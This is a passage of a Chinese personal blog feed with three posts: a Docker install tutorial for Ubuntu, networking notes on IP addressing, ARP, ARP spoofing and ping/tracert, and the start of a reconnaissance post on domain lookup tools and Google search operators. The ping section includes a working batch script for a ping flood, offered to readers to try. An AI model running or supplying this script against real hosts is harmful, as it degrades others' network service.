容器可以随开随关，很适合动态扩容和缩容。</p><p><strong>（3）组建<strong><strong>微服务架构</strong></strong>。</strong>通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。</p><p>Docker容器与传统的虚拟机不同，它们不包含完整的操作系统。Docker容器共享主机的操作系统内核，只包含应用程序及其依赖项。这样，Docker提供了一种更轻量级、快速和高效的虚拟化解决方案，特别适用于现代应用程序的开发、部署和运行。</p><h1 id="二、Docker的安装"><a href="#二、Docker的安装" class="headerlink" title="二、Docker的安装"></a>二、Docker的安装</h1><p>docker有两个版本：社区版（CE）、企业版（EE）</p><p>对于个人开发者来说社区版就可以</p><p>Docker CE 的安装请参考官方文档。</p><blockquote><ul><li><a href="https://docs.docker.com/docker-for-mac/install/">Mac</a></li><li><a href="https://docs.docker.com/docker-for-windows/install/">Windows</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">Ubuntu</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/debian/">Debian</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/centos/">CentOS</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/fedora/">Fedora</a></li><li><a href="https://docs.docker.com/install/linux/docker-ce/binaries/">其他 Linux 发行版</a></li></ul></blockquote><p>具体安装哪个取决于你的操作系统及架构</p><p>对于我来说的的话因为是第一次安装难免会遇到一些问题而linux版本的docker文章先对来说比较多所以我建议安装Ubuntu或者CentOS版本的docker</p><p>以Ubuntu为例：首先我们要<strong>检查卸载老版本docker</strong></p><p>ubuntu下自带了docker的库，不需要添加新的源。</p><p>但是ubuntu自带的docker版本太低，需要先卸载旧的再安装新的。</p><p>注：docker的旧版本不一定被称为docker，docker.io 或 docker-engine也有可能，所以我们卸载的命令为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get remove docker docker-engine docker.io containerd runc</span><br></code></pre></td></tr></table></figure><p>然后</p><p>1.更新安装包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo apt update<br>sudo apt upgrade<br></code></pre></td></tr></table></figure><p>2.安装docker依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">apt-get install ca-certificates curl gnupg lsb-release<br></code></pre></td></tr></table></figure><p>3.添加docker软件源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;<br></code></pre></td></tr></table></figure><p>4.安装docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">apt-get install docker-ce docker-ce-cli containerd.io<br></code></pre></td></tr></table></figure><p>5.配置用户组（建议）</p><p>因为docker在默认情况下只有root用户和docker用户才能够运行docker的命令，如果我们把当前用户添加到docker组，可以省去每次使用docker都需要输入密码进入root用户的麻烦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo usermod -aG docker $USER<br></code></pre></td></tr></table></figure><p>运行docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">systemctl start docker<br></code></pre></td></tr></table></figure><p>6.安装工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">apt-get -y install apt-transport-https ca-certificates curl software-properties-common<br></code></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">service docker restart<br></code></pre></td></tr></table></figure><p>查看docker版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">docker version<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100323.png" alt="img"></p><p>docker的目录如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041102328.png" alt="屏幕截图 2024-08-03 141307"></p><p>在docker中有一个比较特殊的文件</p><h1 id="三、image文件"><a href="#三、image文件" class="headerlink" title="三、image文件"></a>三、image文件</h1><p><strong>Docker 把应用程序及其依赖，打包在 image 文件里面。</strong>只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。</p><p>image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">列出本机的所有 image 文件。</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker image <span class="hljs-built_in">ls</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除 image 文件</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker image <span class="hljs-built_in">rm</span> [imageName]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041102635.png" alt="屏幕截图 2024-08-03 142443"></p><p>image 文件是通用的，一台机器的 image 文件拷贝到另一台机器，照样可以使用。一般来说，为了节省时间，我们应该尽量使用别人制作好的 image 文件，而不是自己制作。即使要定制，也应该基于别人的 image 文件进行加工，而不是从零开始制作。</p><p>为了方便共享，image 文件制作完成后，可以上传到网上的仓库。Docker 的官方仓库 <a href="https://hub.docker.com/">Docker Hub</a> 是最重要、最常用的 image 仓库。此外，出售自己制作的 image 文件也是可以的。</p><h1 id="四、实例：hello-world"><a href="#四、实例：hello-world" class="headerlink" title="四、实例：hello world"></a>四、实例：hello world</h1><p>这个就会涉及到一个操作：需要将 image 文件从仓库抓取到本地（需要说明的是，国内连接 Docker 的官方仓库很慢，还会断线，需要将默认仓库改成国内的镜像网站）</p><h2 id="1-改镜像"><a href="#1-改镜像" class="headerlink" title="1.改镜像"></a>1.改镜像</h2><p>首先</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo vim /etc/docker/daemon.json<br></code></pre></td></tr></table></figure><p>  这个文件一般都没有但是这个目录一般都有没有就<code>sudo mkdir -p /etc/docker</code>     创建一个目录</p><p>然后在daemon.json写入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;registry-mirrors&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;https://hub.uuuadc.top&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://docker.anyhub.us.kg&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://dockerhub.jobcher.com&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://dockerhub.icu&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://docker.ckyl.me&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;https://docker.awsl9527.cn&quot;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>保存退出即可</p><p>最后，使 systemd 重新读取并应用所有的单元文件，[以确保最新的配置生效]并重启 Docker 服务。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell">sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure></blockquote><p>现在就会自动从镜像仓库下载 image 文件了</p><h2 id="2-抓取image文件并运行"><a href="#2-抓取image文件并运行" class="headerlink" title="2.抓取image文件并运行"></a>2.抓取image文件并运行</h2><p>首先，运行下面的命令，将 image 文件从仓库抓取到本地。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker image pull library/hello-world</span><br></code></pre></td></tr></table></figure></blockquote><p>上面代码中，<code>docker image pull</code>是抓取 image 文件的命令。<code>library/hello-world</code>是 image 文件在仓库里面的位置，其中<code>library</code>是 image 文件所在的组，<code>hello-world</code>是 image 文件的名字。</p><p>由于 Docker 官方提供的 image 文件，都放在<code>library</code>组里面，所以它的是默认组，可以省略。因此，上面的命令可以写成下面这样。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker image pull hello-world</span><br></code></pre></td></tr></table></figure></blockquote><p>抓取成功以后，就可以在本机看到这个 image 文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041102497.png" alt="屏幕截图 2024-08-03 153132"></p><p>现在，运行这个 image 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker run hello-world<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041103718.png" alt="屏幕截图 2024-08-03 153408"></p><p>成功！</p><p>还有有一种可以自动抓取 image 文件如果发现本地没有指定的 image 文件，就会从仓库自动抓取这样就不用先抓取再运行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker container run hello-world<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100910.png" alt="img"></p><p>输出这段提示以后，<code>hello world</code>就会停止运行，容器自动终止。</p><p>有些容器不会自动终止，因为提供的是服务。比如，安装运行 Ubuntu 的 image，就可以在命令行体验 Ubuntu 系统。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker container run -it ubuntu bash<br></code></pre></td></tr></table></figure></blockquote><p>对于那些不会自动终止的容器，使用<code>docker kill</code>或者是输入exit手动退出。</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker kill [containID]<br></code></pre></td></tr></table></figure></blockquote><p>注意：可以使用<code>docker ps</code>来查询containID</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100328.png" alt="img"></p><p>​                                上图表示运行ubuntu bash并进行交互</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100315.png" alt="img"></p><p>在上图中使用到了docker ps来查询列出所有当前正在运行的容器，并显示它们的容器ID、镜像、命令、创建时间、状态、端口和名称</p><p>并且使用了docker kill来退出docker的ubuntu系统</p><p>注意：在docker中运行docker是需要特殊配置的对于我目前来说不常用感兴趣的可以试着玩玩</p><p>​          上图表示使用ex<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041104343.png" alt="屏幕截图 2024-08-03 160252">it退出docker中的ubuntu系统</p><p>删除容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">docker rm 5eedf2c63f7b<br></code></pre></td></tr></table></figure><h1 id="五、Docker可视化工具portainer的安装"><a href="#五、Docker可视化工具portainer的安装" class="headerlink" title="五、Docker可视化工具portainer的安装"></a>五、Docker可视化工具portainer的安装</h1><p>portainer：<a href="https://juejin.cn/post/7174298638758182925">https://juejin.cn/post/7174298638758182925</a></p><p>在虚拟机启动后可以使用虚拟机的ipv4地址来在主机进行访问 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041104878.png" alt="屏幕截图 2024-08-03 171135">我在启动服务的时候开放的是9000端口所以直接访问192.168.10.132:9000即可（在主机或者虚拟机都可以访问)</p><p>这是在本地启动的服务（第一次登陆的时候需要先设置密码）</p><p>感觉比较好用</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041105271.png" alt="屏幕截图 2024-08-03 165449"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100156.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202408041100204.png" alt="img"></p>]]></content>
    
    
    
    <tags>
      
      <tag>-Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集的相关拓展(计网)</title>
    <link href="/2024/07/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95/"/>
    <url>/2024/07/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="ip地址及公、私有ip和子网掩码"><a href="#ip地址及公、私有ip和子网掩码" class="headerlink" title="ip地址及公、私有ip和子网掩码"></a>ip地址及公、私有ip和子网掩码</h1><h2 id="私有IP："><a href="#私有IP：" class="headerlink" title="私有IP："></a>私有IP：</h2><ul><li>10.0.0.0 到 10.255.255.255</li><li>172.16.0.0 到 172.31.255.255</li><li>192.168.0.0 到 192.168.255.255</li></ul><p>如果不在以上的范围中则可能是一个共有ip</p><h2 id="为什么要分开私有ip和公有ip：（了解即可不必细究"><a href="#为什么要分开私有ip和公有ip：（了解即可不必细究" class="headerlink" title="为什么要分开私有ip和公有ip：（了解即可不必细究)"></a>为什么要分开私有ip和公有ip：（了解即可不必细究)</h2><p><strong>地址空间****管理</strong>：</p><ul><li>私有 IP 地址范围（如 192.168.x.x、10.x.x.x）专门为局域网设计，允许多个组织或个人在内部网络中使用相同的 IP 地址，而不会发生冲突。这样可以避免因为全球范围内的地址枯竭而导致 IP 地址不足。</li></ul><p><strong>安全性</strong>：</p><ul><li>私有 IP 地址仅在局域网内部可见和访问，不直接暴露在公共互联网上，从而提高了网络的安全性。公共互联网上的攻击者无法直接访问或扫描局域网中的私有 IP 设备。</li></ul><p><strong>网络隔离</strong>：</p><ul><li>通过使用 NAT（网络地址转换）技术，将私有 IP 地址映射到公有 IP 地址，可以有效隔离局域网和公共互联网。这种隔离有助于减少潜在的网络攻击面，并提高网络的安全性和稳定性。</li></ul><p><strong>地址冲突避免</strong>：</p><ul><li>私有 IP 地址在全球范围内是唯一的，不会与其他网络冲突。这使得不同组织或家庭可以在自己的网络中使用相同的 IP 地址范围，而不会互相干扰。</li></ul><p><strong>简化路由和管理</strong>：</p><ul><li>使用私有 IP 地址可以简化局域网内部的路由和管理。网络管理员可以更容易地控制和监视内部网络的流量和访问控制。</li></ul><p><strong>IP</strong> <strong>地址节约</strong>：</p><ul><li>由于私有 IP 地址不需注册和分配给每个设备，这种管理方式节约了全球 IP 地址资源。</li></ul><p>私有IP地址在局域网中使用，而公网IP地址用于在互联网中唯一标识设备</p><h2 id="ip分为网络号和主机号"><a href="#ip分为网络号和主机号" class="headerlink" title="ip分为网络号和主机号"></a>ip分为网络号和主机号</h2><p>通俗的来说网络号是为了区分不同的局域网 主机号是为了区分在同一局域网中的不同主机</p><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>因为假如说：192.168.123.123这个私有ip他的网络号可以是第一个部分也可以是一、二 两个部分还有可能是一、二、三 仨部分 剩余的就是主机部分</p><p>而子网掩码的存在是为了区分哪部分是网络号哪部分是主机号甚至呢个够精准到某一位</p><p>具体的解释可以去看看视频【<a href="https://www.bilibili.com/video/BV1xu411f7UW/">IPv4地址和子网掩码</a>】</p><h1 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h1><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>arp协议就是把一个ip地址绑定到一个mac地址上方便发送信息给指定的计算机</p><p>（就是ARP协议用于解析IP地址到MAC地址的映射关系。）</p><p><strong>？</strong>至于在同一个局域网中为什么不能直接使用ip进行通信还要通过arp协来引入mac地址来进行通信的原因：</p><p>1.是因为计算机的网络通信遵循OSI模型：其中只要是计算机通信就要涉及到不同层次间的数据传输 </p><p>2.而以上的通信过程就涉及到数据链路层和网络层两个层次</p><p>当一个设备在局域网中发送数据时，数据包会经历以下几个步骤：</p><p>（1）<strong>应用层到****网络层</strong>：数据生成后，设备会在应用层和传输层中添加应用数据和传输数据（例如，HTTP数据和TCP&#x2F;UDP数据），接着在网络层添加IP头部信息，包括源IP地址和目标IP地址。</p><p>（2）<strong>网络层<strong><strong>到</strong></strong>数据链路层</strong>：数据包被传递到数据链路层，此时需要封装成帧。为了使帧在局域网内传输，设备需要知道目标设备的MAC地址。</p><p>当然：在同一个局域网内，确实可以直接使用MAC地址进行通信。但是仅限在同一个局域网中。详细了解建议去看计<a href="https://qcn19df42ger.feishu.cn/wiki/SOVgwPeLMilexAkJY5KcGvtOnAb">计算机网络基础.docx</a></p><p>嘿嘿嘿借用一下</p><p><strong>？</strong>那在我们去通过一个公网ip去访问一个服务器的时候arp是如何参与的？</p><p>（1）当你的设备试图访问公网上的一个 IP 地址时，它首先检查目标 IP 地址是否在同一子网内。如果是，它直接尝试与目标通信。</p><p>（2）如果目标 IP 地址不在同一子网内，你的设备会将数据包发送给默认网关（路由器），它将充当你的设备和公网之间的中间人。这个过程通常涉及到 ARP（地址解析协议）。</p><p>（3）你的设备会发送一个 ARP 请求，询问网关的 MAC 地址。一旦得到回复，你的设备就会把数据包发送到网关的 MAC 地址。网关收到数据包后，根据自身的路由表确定数据包的下一个跳（通常是 ISP 的路由器或互联网上的下一个跳），然后转发数据包。【其中的吓一跳通常是指数据包应该转发到的下一个路由器】</p><p>（4）最终到目标网关【其实我们所输入的公网ip其实就是网关的共有ip】</p><p>这种情况如果说是一个服务器对应一个网关还比较容易理解</p><p>但是如果多个服务器共用一个路由器网关的情况就需要一种路由器的机制</p><p><strong>端口****转发：</strong>端口转发是最常见的方法之一。路由器根据接收到的请求的目标端口号，将流量转发到内部网络中的特定服务器和端口</p><p><strong>网络地址转换<strong><strong>（</strong></strong>NAT****）：</strong>NAT可以让多个内部服务器共享一个公网IP地址。路由器维护一个NAT表，记录内部私有IP和端口号与外部公共IP和端口号的对应关系。当外部请求到达时，路由器会查找NAT表，确定将流量转发到哪台内部服务器。</p><p>负载均衡：负载均衡器可以将流量分配到多个后端服务器，以提高系统的性能和可用性。负载均衡器可以根据不同的算法（如轮询、最小连接数等）将请求分配给不同的服务器。</p><p><strong>反向代理****：</strong>反向代理服务器接收所有外部请求，然后根据请求的内容（例如URL路径、头信息等），将请求转发给适当的内部服务器。反向代理不仅可以分配流量，还可以缓存内容、提供SSL加密等服务。</p><p>反向代理服务器是把来自客户端的请求按目标分发不同的内部服务器</p><p>{</p><p>作用</p><ul><li><strong>负载均衡</strong>：分配请求到多台服务器，以均衡负载，提升性能和可靠性。</li><li><strong>安全性</strong>：隐藏内部服务器的真实IP地址，防止直接攻击，提高安全性。</li><li><strong>缓存</strong>：缓存静态内容，减少内部服务器负载，加快响应速度。</li><li><strong>SSL****终止</strong>：集中管理SSL证书，处理SSL加密解密，简化内部服务器的配置。</li><li><strong>内容分发</strong>：根据请求内容，将请求分发到不同的内部服务器或服务器组。</li></ul><p>}</p><p>正向代理是代理客户端可隐藏客户端的真实ip</p><p>{</p><p>作用</p><ul><li><strong>访问控制</strong>：控制客户端的访问权限，如限制访问特定网站。</li><li><strong>匿名访问</strong>：隐藏客户端的真实IP地址，保护隐私。</li><li><strong>缓存</strong>：缓存常访问的内容，提高访问速度，减少带宽使用。</li><li><strong>绕过限制</strong>：帮助客户端绕过网络限制或防火墙，访问受限资源。</li></ul><p>}</p><h3 id="APR欺骗"><a href="#APR欺骗" class="headerlink" title="APR欺骗"></a>APR欺骗</h3><p><strong>攻击步骤</strong></p><p><strong>扫描网络</strong>：攻击者首先扫描网络以获取 IP 地址和对应的 MAC 地址。</p><p><strong>发送伪造</strong> <strong>ARP</strong> <strong>响应</strong>：攻击者发送伪造的 ARP 响应消息，将自己的 MAC 地址冒充成网关或其他目标设备的 MAC 地址。</p><p><strong>接收数据包</strong>：受害者的设备更新其 ARP 缓存，将攻击者的 MAC 地址与目标 IP 地址关联。随后，数据包会被错误地发送到攻击者的设备。</p><p><strong>中间人攻击</strong>：攻击者可以选择窃听、修改数据包，或者将数据包转发给真正的目标设备，使得受害者不易察觉到攻击的存在。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ol><li>数据窃取</li><li>数据篡改</li><li>服务中断</li></ol><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li><strong>静态 ARP 表</strong>：在网络设备上配置静态 ARP 表，防止 ARP 表被动态更新。</li><li><strong>ARP 监控工具</strong>：使用工具监控网络中的 ARP 流量，检测异常的 ARP 消息。</li><li><strong>加密通信</strong>：使用 HTTPS、SSH 等加密协议，防止中间人攻击窃取敏感信息。</li><li><strong>交换机安全功能</strong>：启用交换机的安全功能，如动态 ARP 检测（Dynamic ARP Inspection，DAI）和端口安全（Port Security），防止 ARP 欺骗攻击。</li><li><strong>VPN</strong>：使用虚拟专用网络（VPN）进行加密通信，保护数据传输的安全性。</li></ol><p>arp欺骗的正当的使用：在应急的时候可以用来快速切换设备</p><h1 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ping命令是比较常见的一个测试是否联通的命令 以下是这几天来我捣鼓的新知识。</p><h2 id="知识概括"><a href="#知识概括" class="headerlink" title="知识概括"></a>知识概括</h2><p>Ping [ip] 可测试本机对于一个ip是否可以联通</p><p>tracert [ip] 这个命令可以让你知道你所发送的数据包到底是在哪里出的问题导致不可达 </p><p>​                  可以追踪你的数据包所经过的每一个网络节点{每个跃点代表数据包从你的计算机到目标IP地址经过的一个网络设备。通常，这些设备可能是路由器、网关或其他网络节点。}</p><p>ping泛洪攻击（也叫ICMP泛洪攻击）中所需要注意到的点以及目前我所遇到的有那种情况会导致此类攻击不成功</p><h2 id="ping不通或请求超时的解决办法"><a href="#ping不通或请求超时的解决办法" class="headerlink" title="ping不通或请求超时的解决办法"></a>ping不通或请求超时的解决办法</h2><p>  可以先使用tracert追踪看看数据包访问目标所经过的路径看一下在哪个节点出现了请求超时的情况（tracert适用于windows  traceroute适用于linux macos系统而且相对tracert来说所支持的通信协议更多不只是有icmp还有udp等</p><p>至于在实际操作中具体使用哪个依据情况来确定）注意：ping 和 tracert 这两个命令是独立进行的</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221543058.png" alt="98ce8236-fee3-430f-93e2-3e3726415ad1"></p><p>上图是我使用tracert进行路由追踪的一个结果 在找无法ping通或请求超时的原因的时候不能只是去看是不是在tracert的结果中哪一个跃点请求超时 因为有的路由器或者防火墙之类的设备为了防止发现网络拓扑图会禁止这类的数据包进行响应 虽然在上图中的一些跃点请求超时但是在实际的去ping的时候仍然有可能ping通 所以我们在tracert之后可以再进行一个跃点一个跃点的去ping 这样可以找出问题到底出现在哪里 哪个ip；</p><h2 id="Ping泛洪攻击（ICMP泛洪攻击）"><a href="#Ping泛洪攻击（ICMP泛洪攻击）" class="headerlink" title="Ping泛洪攻击（ICMP泛洪攻击）"></a>Ping泛洪攻击（ICMP泛洪攻击）</h2><p>我在这次进行泛洪攻击的时候所进行的第一次尝试是直接在虚拟机上尝试的然后发现没啥影响</p><p>可能是我线程太少导致的   还有一个原因：</p><p>虚拟化平台防护：许多虚拟化平台（如VMware、Hyper-V等）内置了一些防护措施，能够识别并限制泛洪攻击，防止其影响虚拟机的正常运行。</p><p>然后我直接关掉了我哥电脑的防火墙直接拿他的电脑开整</p><p>ping 192.168.<em>.</em> -l 65500 -t（命令啥意思自己查） </p><p>结果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202407221543580.png" alt="790f0486-a358-41fe-a3ec-6f7606feab88"></p><p>后面变平了是因为我停止了ping泛洪</p><p>我开的是20线程的会对笔记本的网络访问造成影响但是还达不到完全”断网”的效果可能是我的线程开的比较小的原因 </p><p>脚本放这里了大家感兴趣的可以拿着玩一玩（这是一个批处理脚本 把文件后缀改成 .bat即可 点击即可运行）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">set</span> target_ip=填写目标ip<br><span class="hljs-built_in">set</span> packet_size=65500<br><span class="hljs-built_in">set</span> /a ping_count=写线程数<br><br>:ping_loop<br><span class="hljs-keyword">for</span> /L %%i <span class="hljs-keyword">in</span> (1,1,%ping_count%) <span class="hljs-keyword">do</span> (<br>    start ping %target_ip% -l %packet_size% -t<br>)<br>pause<br>goto ping_loop<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集</title>
    <link href="/2024/07/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2024/07/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="一、查子域名及网站的相关的信息"><a href="#一、查子域名及网站的相关的信息" class="headerlink" title="一、查子域名及网站的相关的信息"></a>一、查子域名及网站的相关的信息</h2><p>有关域名的相关信息查询</p><p>1.<a href="https://ping.chinaz.com/chatgpt.com">站长工具ping判断是否拒绝CND</a></p><p>2.<a href="https://ip.tool.chinaz.com/">IP&#x2F;IPV6查询，服务器地址查询-站长工具</a>ip反查</p><p>3.<a href="https://who.is/">WHOIS 搜索网站相关的注册信息 - Who.is</a></p><p>4.<a href="https://icp.chinaz.com/">ICP备案查询_APP及小程序备案查询 - 站长工具</a></p><p>5.<a href="https://site.ip138.com/www.baid.com/">dns 子域名 备案 域名信息 备案</a></p><p>6.<a href="https://whois.cloud.tencent.com/domain?domain=chatgpt.com">域名注册信息查询 - 腾讯云</a></p><p>7.<a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></p><p>这是一个在线网站可以帮助用户检测恶意软件、病毒和其他安全威胁。它通过对文件、URL、IP地址等进行扫描和分析来提供安全性报告</p><p>在信息搜集的过程中我们主要是要使用这个工具有一个url或者ip的网络图其中这个域名的子域名还有相关备案信息、SSL、TLS证书，相关联文件，exe程序……</p><p>这个分析网站挺不错的</p><h2 id="二、Google语法"><a href="#二、Google语法" class="headerlink" title="二、Google语法"></a>二、Google语法</h2><h3 id="1-基础（不必理会）"><a href="#1-基础（不必理会）" class="headerlink" title="1.基础（不必理会）"></a>1.基础（不必理会）</h3><p>Google搜索引擎</p><p>Index of&#x2F;　　使用它可以直接进入网站首页下的所有文件和文件夹中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Index`` of/</span><br></code></pre></td></tr></table></figure><p>intext:　　将返回所有在网页正文部分包含关键词的网页</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">intext:<span class="hljs-string">&quot;Python 教程&quot;</span> site:<span class="hljs-string">``</span>cnblogs.com<br></code></pre></td></tr></table></figure><p>intitle:　　将返回所有网页标题中包含关键词的网页</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">intitle:<span class="hljs-string">&quot;Python 教程&quot;</span> site:<span class="hljs-string">``</span>cnblogs.com<br></code></pre></td></tr></table></figure><p>cache:　　搜索google里关于某些内容的缓存</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">cache</span>:<span class="hljs-string">``</span>www.csdn.net<br></code></pre></td></tr></table></figure><p>define:　　搜索某个词语的定义</p><figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs puppet"><span class="hljs-keyword">define</span>:<span class="hljs-section">API</span><br></code></pre></td></tr></table></figure><p>filetype:　　